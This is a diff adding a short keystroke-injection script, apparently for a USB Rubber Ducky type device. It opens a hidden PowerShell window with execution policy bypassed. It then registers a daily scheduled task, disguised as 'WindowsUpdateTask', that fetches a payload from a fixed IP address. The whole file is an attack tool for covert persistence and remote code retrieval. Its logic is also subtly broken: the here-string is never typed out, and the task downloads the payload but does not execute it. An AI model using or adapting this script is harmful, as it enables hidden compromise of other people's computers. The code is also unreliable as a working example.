@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Task scheduler persistence
+$string = @"
+`$taskName = "WindowsUpdateTask"
+`$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri 'http://192.168.1.100/payload' -UseBasicParsing`""
+`$trigger = New-ScheduledTaskTrigger -Daily -At 3am
+`$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
